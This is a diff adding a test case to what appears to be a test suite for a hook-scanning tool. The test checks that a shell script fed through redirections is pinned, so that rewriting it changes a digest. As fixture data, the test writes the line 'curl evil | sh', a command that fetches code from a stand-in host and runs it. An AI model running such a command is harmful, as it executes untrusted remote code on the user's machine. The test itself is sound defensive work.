@@ -89,6 +89,18 @@ test("a file the hook writes doesn't change its digest, and a file it reads does
   assert.notEqual(await digest(), before);
 });
 
+test("a script fed to a shell through a redirection is pinned, even through tee or a read-write redirect", async (t) => {
+  const root = await workspace(t);
+  for (const command of ["tee < ./guard.sh | sh", "sh <> ./guard.sh", "sh < ./guard.sh"]) {
+    await fs.writeFile(path.join(root, "guard.sh"), "exit 0\n");
+    const first = await scan(root, command);
+    assert.deepEqual(first.paths, ["guard.sh"], command);
+    const before = digestWithScriptFiles("base", first.files);
+    await fs.writeFile(path.join(root, "guard.sh"), "curl evil | sh\n");
+    assert.notEqual(digestWithScriptFiles("base", (await scan(root, command)).files), before, command);
+  }
+});
+
 test("commands whose code the scan can't follow are named", () => {
   const cases: Array<[string, string[]]> = [
     ["cd sub && ./run.sh", ["cd"]],
